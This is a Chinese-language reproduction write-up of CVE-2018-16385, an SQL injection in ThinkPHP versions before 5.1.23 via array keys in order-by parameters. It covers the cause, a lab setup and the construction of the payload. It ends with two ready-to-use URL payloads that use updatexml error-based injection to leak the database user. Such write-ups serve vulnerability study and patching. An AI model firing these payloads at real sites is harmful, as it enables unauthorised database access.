# （CVE-2018-16385）Thinkphp < 5.1.23 sql注入漏洞

> 原文：[https://www.zhihuifly.com/t/topic/3169](https://www.zhihuifly.com/t/topic/3169)

# （CVE-2018-16385）Thinkphp 5.1.x SQL注入

## 一、漏洞简介

在ThinkPHP5.1.23之前的版本中存在SQL注入漏洞，该漏洞是由于程序在处理order by 后的参数时，未正确过滤处理数组的key值所造成。如果该参数用户可控，且当传递的数据为数组时，会导致漏洞的产生。

## 二、漏洞影响

ThinkPHP < 5.1.23

## 三、复现过程

### 环境搭建

#### 1.下载安装thinkphp5.1.x

对于thinkphp5.1.x完整版，目前官方没有直接下载的链接。Github上只是放出核心版。该版本需要以Composer或Git方式进行安装。

这里以Composer安装方式说明。

在 Linux 和 Mac OS X 中可以运行如下命令：

```
curl -sS https://getcomposer.org/installer | php `mv composer.phar/usr/local/bin/composer` 
```

在 Windows 中，你需要下载并运行 Composer-Setup.exe 。

安装好之后，切换路径到WEB目录下运行：

```
composercreate-project topthink/think=5.1.1 tp5.1 --prefer-dist 
```

然后会生成一个名为tp5.1的文件夹。到此think5.1.1下载成功。

#### 2.然后在浏览器中访问

![image](img/505f3d280bad3198c0c7d8e58df6786b.png)

image.png如果出现该页面，则证明安装成功。

#### 3.Demo示例

![image](img/1951a98ac248ee86b94f31374aaa1ecd.png)

编写Demo文件，并将文件命名为Test.php，然后放在/tp5.1/application/index/controller/目录下。

#### 4.数据库

与Demo文件匹配，需要创建一个user表，然后设一个字段(id)。

![image](img/8c407e32eb23d9a8a4918ea0be1dce34.png)

### Payload构造

根据以上分析，构造payload需要满足以下条件：

1.传入的$order需要是一个数组。

2.$val 必须也是数组。

3.至少知道数据库表中的一个字段名称，并且传入两个参数。

4.闭合 ` 。

最终Payload构造如下：

```
http://0-sec.org/tp5.1/public/index/test/index?order[id`,111)|updatexml(1,concat(0x3a,user()),1)%23][]=1 
```

或

```
http://0-sec.org/tp5.1/public/index/test/index?order[id`,'aaa')| updatexml(1,concat(0x3a,user()),1)%23][]=1 
```